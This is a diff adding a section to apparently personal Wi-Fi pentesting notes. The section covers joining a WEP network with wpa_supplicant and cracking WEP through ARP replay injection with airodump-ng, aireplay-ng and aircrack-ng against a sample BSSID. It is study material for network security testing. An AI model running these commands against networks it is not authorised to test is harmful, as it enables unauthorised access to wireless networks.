@@ -338,6 +338,42 @@ It is important to have a different exit public IP address for any guest regardi
 
 <img src="./images/mpdu.png" width="700"/>
 
+##### Connecting using wpa_supplicant
+
+```
+wpa_supplicant -i wlan0 -c wep.conf
+wpa_supplicant -B -i wlan0 -c wep.conf
+```
+
+wep.conf
+```
+network={
+    scan_ssid=1
+    ssid="WepCorpo"
+    key_mgmt=NONE
+    wep_key0="Password123"
+    wp_tx_keyidx=0
+}
+```
+
+##### Crack WEP
+- 250,000 IVs for cracking 64 bit WEP Key
+- 1,500,000 IVs for cracking 128-bit WEP Key
+
+--> You can do passive IV capture (but it will take time)  
+OR
+--> Inject traffic to force more packets and more IVs (Replay Attack) 
+- Capture ARP packet and send to AP, it will send reply.
+
+```
+sudo airodump-ng -i wlan1 --bssid 14:D6:4D:26:73:96 -w wep
+sudo aireplay-ng -3 -b 14:D6:4D:26:73:96 -h 66:B9:B8:1D:EC:66 wlan1
+sudo aircrack-ng wep-01.ivs
+```
+
+<img src="./images/wep_attack_arp_replay.png" width="500"/>
+
+
 ## WPA
 
 ## WPA2
